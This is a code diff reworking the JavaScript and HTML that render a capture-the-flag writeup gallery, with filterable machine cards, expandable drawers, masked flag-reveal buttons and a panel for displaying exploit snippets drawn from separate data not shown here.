+      if (data.commands && data.commands.length) {
+        commandsHtml = `<div class="panel-card" style="margin-top: 28px;"><div class="box-title">⌨️ Exploit snippets</div><div class="terminal-window" style="background:#0b0618; padding:14px; font-family:monospace; font-size:0.8rem;">${data.commands.map(c => `<div><span style="color:var(--neon-purple);">$</span> ${c}</div>`).join('')}</div></div>`;
+      }
+      
+      // Task & flag reveal block with buttons (same style as target logs)
+      const taskHtml = `
+        <div style="display: flex; flex-wrap: wrap; gap: 28px; margin: 28px 0 20px;">
+          <div style="flex:1; background: rgba(0,0,0,0.4); border-radius: 20px; padding: 16px;">
+            <div class="box-title">USER FLAG</div>
+            <div style="margin: 12px 0;">${userFlagMasked}</div>
+            <button class="sys-badge" style="background: var(--neon-purple); color:#000; border:none; cursor:pointer;" onclick="revealWriteupFlag('drawer-user-flag', '${data.tasks.userFlag}')">🔓 REVEAL USER FLAG</button>
           </div>
-        </div>
-      ` : '';
-
-      // Full writeup link
-      const fullLink = d.hasFullWriteup
-        ? `<a href="target-logs.html?machine=${machineId}" style="display:inline-flex;align-items:center;gap:8px;margin-top:20px;font-family:var(--font-mono);font-size:0.8rem;color:var(--neon-purple);border:var(--border-purple);padding:8px 16px;border-radius:8px;background:rgba(168,85,247,0.06);text-decoration:none;transition:all 0.15s;">OPEN FULL REPORT ↗</a>`
-        : `<div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-dark);margin-top:16px;">// Full writeup coming soon</div>`;
-
-      const drawer = document.createElement('div');
-      drawer.className = 'wu-drawer open';
-      drawer.innerHTML = `
-        <button class="drawer-close" onclick="closeDrawer()">✕ CLOSE</button>
-
-        <div class="page-header" style="padding-top:0; margin-bottom:24px;">
-          <div class="sys-badge" style="color:${d.diffColor}; border-color:${d.diffColor}33;">${d.badge}</div>
-          <h2 style="font-size:2rem;font-weight:700;margin-top:8px;">${d.title}</h2>
-        </div>
-
-        <div class="about-layout" style="margin-top:0;">
-          <div class="about-sidebar">
-            <div class="terminal-string">// TELEMETRY</div>
-            <p style="color:var(--text-muted);font-size:0.88rem;line-height:2;font-family:var(--font-mono);">
-              TIME &nbsp;&nbsp;// ${d.time}<br>
-              OS &nbsp;&nbsp;&nbsp;&nbsp;// ${d.os}<br>
-              PORT &nbsp;&nbsp;// ${d.port}
-            </p>
-            <div class="terminal-string" style="margin-top:16px;">// VECTOR</div>
-            <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--neon-purple);line-height:1.6;">${d.vector}</p>
-            ${fullLink}
-          </div>
-
-          <div class="timeline">
-            ${nodesHtml}
-            ${tasksHtml}
-            ${flagHtml}
+          <div style="flex:1; background: rgba(0,0,0,0.4); border-radius: 20px; padding: 16px;">
+            <div class="box-title">ROOT FLAG</div>
+            <div style="margin: 12px 0;">${rootFlagMasked}</div>
+            <button class="sys-badge" style="background: var(--neon-purple); color:#000; border:none; cursor:pointer;" onclick="revealWriteupFlag('drawer-root-flag', '${data.tasks.rootFlag}')">🔓 REVEAL ROOT FLAG</button>
           </div>
         </div>
       `;
-
-      cardEl.insertAdjacentElement('afterend', drawer);
-      activeDrawer = drawer;
-      setTimeout(() => drawer.scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 60);
+      
+      // side meta (telemetry)
+      const sideMeta = `
+        <div class="about-sidebar" style="margin-bottom: 28px;">
+          <div class="terminal-string">>_ TELEMETRY</div>
+          <div><span style="color:var(--neon-purple);">OS</span> ${data.os}</div>
+          <div><span style="color:var(--neon-purple);">PORTS</span> ${data.ports}</div>
+          <div><span style="color:var(--neon-purple);">TIME_TO_COMPROMISE</span> ${data.time}</div>
+          <div><span style="color:var(--neon-purple);">VECTOR</span> ${data.attackVector}</div>
+        </div>
+      `;
+      
+      const fullLink = (machine.hasFullWriteup && machine.detailLink && machine.detailLink !== '#') 
+        ? `<div class="inline-full-link"><a href="${machine.detailLink}" target="_blank" style="color: var(--neon-cyan); font-family: monospace;">📄 OPEN FULL REPORT ↗</a></div>`
+        : `<div class="inline-full-link"><span style="color: var(--text-muted);">[ full writeup pending ]</span></div>`;
+      
+      return `
+        <div class="about-layout" style="display: flex; flex-wrap: wrap; gap: 28px;">
+          ${sideMeta}
+          <div style="flex: 2.5;">
+            ${timelineHtml}
+            ${commandsHtml}
+            ${taskHtml}
+            ${fullLink}
+          </div>
+        </div>
+      `;
     }
-
-    function closeDrawer() {
-      if (activeDrawer) { activeDrawer.remove(); activeDrawer = null; }
-      if (activeCard)   { activeCard.classList.remove('selected'); activeCard = null; }
-    }
-
-    // reuse your existing helpers
-    function toggleTaskAnswer(btn, answer) {
-      btn.innerText = answer;
-      btn.style.background = "var(--neon-green)";
-      btn.style.color = "#000";
-    }
-    function revealTargetFlag(btn, flag) {
-      const mask = btn.previousElementSibling.querySelector('.flag-blurred-mask');
-      if (mask) {
-        mask.innerText = flag;
-        mask.style.filter = "none";
-        mask.style.opacity = "1";
-        btn.style.display = "none";
+    
+    // global reveal function for flags inside drawer
+    window.revealWriteupFlag = function(elementId, flagValue) {
+      const el = document.getElementById(elementId);
+      if (el) {
+        el.innerText = flagValue;
+        el.style.filter = "none";
+        el.style.opacity = "1";
+        el.style.background = "#0f0a1e";
       }
-    }
-
-    // Filtering
-    document.querySelectorAll('.filter-pill').forEach(pill => {
-      pill.addEventListener('click', function() {
-        document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
-        this.classList.add('active');
-        closeDrawer();
-        const f = this.dataset.filter;
-        document.querySelectorAll('#wu-grid .bento-box').forEach(card => {
-          const show = f === 'all' || card.dataset.difficulty === f || (card.dataset.tags||'').includes(f);
-          card.style.display = show ? '' : 'none';
+    };
+    
+    // Render cards + attach event listeners
+    function renderWriteups(filter = "all") {
+      const grid = document.getElementById("writeups-grid");
+      if (!grid) return;
+      let filtered = [...MACHINE_LIST];
+      if (filter !== "all") {
+        filtered = filtered.filter(m => m.difficulty === filter || m.category === filter);
+      }
+      if (filtered.length === 0) {
+        grid.innerHTML = `<div style="grid-column:1/-1; text-align:center; padding:60px;">⛔ no writeups match filter</div>`;
+        return;
+      }
+      
+      grid.innerHTML = filtered.map(machine => `
+        <div class="writeup-card" data-id="${machine.id}" data-difficulty="${machine.difficulty}" data-category="${machine.category}">
+          <div class="bento-box">
+            <div class="box-meta">
+              <span class="difficulty-badge ${diffClass(machine.difficulty)}">⚡ ${machine.difficulty.toUpperCase()}</span>
+              <span class="tag">${machine.category}</span>
+            </div>
+            <div class="box-title">${machine.title}</div>
+            <div class="box-desc" style="margin: 12px 0;">${machine.shortDesc || machine.description}</div>
+            <div class="writeup-tags">
+              ${machine.tags.map(t => `<span class="tag-sm">#${t}</span>`).join('')}
+            </div>
+            <div class="box-footer" style="margin-top: 16px;">
+              <span class="terminal-string">⤷ expand killchain</span>
+            </div>
+          </div>
+        </div>
+        <div class="drawer-container" id="drawer-${machine.id}"></div>
+      `).join('');
+      
+      // attach click listeners to each card
+      document.querySelectorAll('.writeup-card').forEach(card => {
+        const id = card.getAttribute('data-id');
+        card.addEventListener('click', (e) => {
+          e.stopPropagation();
+          toggleDrawer(id, card);
         });
       });
+    }
+    
+    function toggleDrawer(machineId, cardElement) {
+      const drawerContainer = document.getElementById(`drawer-${machineId}`);
+      if (!drawerContainer) return;
+      
+      const wasOpen = drawerContainer.classList.contains('open');
+      // close all drawers
+      document.querySelectorAll('.drawer-container').forEach(d => d.classList.remove('open'));
+      document.querySelectorAll('.writeup-card').forEach(c => c.classList.remove('active'));
+      
+      if (!wasOpen) {
+        // open new drawer
+        const machine = MACHINE_LIST.find(m => m.id === machineId);
+        if (machine && drawerContainer) {
+          const drawerHTML = `
+            <div class="drawer-content">
+              <div class="drawer-header">
+                <h3>📡 ${machine.title} // offensive capsule</h3>
+                <button class="close-drawer" onclick="this.closest('.drawer-container').classList.remove('open'); document.querySelector('.writeup-card[data-id=\"${machineId}\"]').classList.remove('active');">&times;</button>
+              </div>
+              <div class="drawer-body">
+                ${renderDrawerContent(machine)}
+              </div>
+            </div>
+          `;
+          drawerContainer.innerHTML = drawerHTML;
+          drawerContainer.classList.add('open');
+          if (cardElement) cardElement.classList.add('active');
+          
+          // attach close button re-listen (already handled by onclick inline)
+          const closeBtn = drawerContainer.querySelector('.close-drawer');
+          if (closeBtn) {
+            closeBtn.addEventListener('click', (e) => {
+              drawerContainer.classList.remove('open');
+              if(cardElement) cardElement.classList.remove('active');
+            });
+          }
+        } else {
+          drawerContainer.innerHTML = `<div class="drawer-content"><div class="drawer-body">[!] Writeup data missing for ${machineId}</div></div>`;
+          drawerContainer.classList.add('open');
+        }
+      } else {
+        drawerContainer.classList.remove('open');
+        if(cardElement) cardElement.classList.remove('active');
+      }
+    }
+    
+    // Filter pills behavior
+    function initFilters() {
+      const pills = document.querySelectorAll('.filter-pill');
+      pills.forEach(pill => {
+        pill.addEventListener('click', () => {
+          pills.forEach(p => p.classList.remove('active'));
+          pill.classList.add('active');
+          const filterVal = pill.getAttribute('data-filter');
+          renderWriteups(filterVal);
+          // after re-render close all drawers
+          document.querySelectorAll('.drawer-container').forEach(d => d.classList.remove('open'));
+          document.querySelectorAll('.writeup-card').forEach(c => c.classList.remove('active'));
+        });
+      });
+    }
+    
+    // on load
+    document.addEventListener('DOMContentLoaded', () => {
+      renderWriteups('all');
+      initFilters();
+      
+      // fix any external hrefs related to active nav link
+      const currentPath = window.location.pathname;
+      if (currentPath.includes('writeups.html')) {
+        const writeupNav = document.querySelector('nav.nav-menu a[href="writeups.html"]');
+        if (writeupNav) writeupNav.classList.add('active-nav');
+      }
     });
   </script>
-
 </body>
 </html>
